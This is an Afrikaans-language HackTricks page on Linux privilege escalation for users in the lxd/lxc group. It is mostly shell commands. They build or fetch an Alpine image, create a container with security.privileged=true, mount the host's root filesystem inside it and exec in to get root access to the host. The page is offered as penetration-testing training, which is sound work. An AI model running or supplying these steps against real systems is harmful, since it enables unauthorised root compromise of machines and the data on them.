# lxd/lxc Groep - Privilege escalasie

{{#include ../../../banners/hacktricks-training.md}}

As jy tot die _**lxd**_ **of** _**lxc**_ **groep** behoort, kan jy root word.

## Exploitering sonder internet

### Metode 1

Jy kan 'n alpine beeld aflaai om met lxd van 'n vertroude repository te gebruik.
Canonical publiseer daaglikse boue op hul webwerf: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Neem net beide **lxd.tar.xz** en **rootfs.squashfs** van die nuutste bou. (Gidsnaam is die datum).

Alternatiewelik kan jy hierdie distro bouer op jou masjien installeer: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (volg die instruksies van die github):
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Laai die lêers **incus.tar.xz** (**lxd.tar.xz** as jy dit van die Canonical-bewaarplek afgelaai het) en **rootfs.squashfs** op, voeg die beeld by die repo en skep 'n houer:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> As jy hierdie fout _**Fout: Geen stoorpoel gevind nie. Skep asseblief 'n nuwe stoorpoel**_\
> Voer **`lxd init`** uit en stel al die opsies op standaard in. Herhaal dan **die vorige stel opdragte**

Uiteindelik kan jy die houer uitvoer en root verkry:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Metode 2

Bou 'n Alpine beeld en begin dit met die vlag `security.privileged=true`, wat die houer dwing om as root met die gasheer lêerstelsel te kommunikeer.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
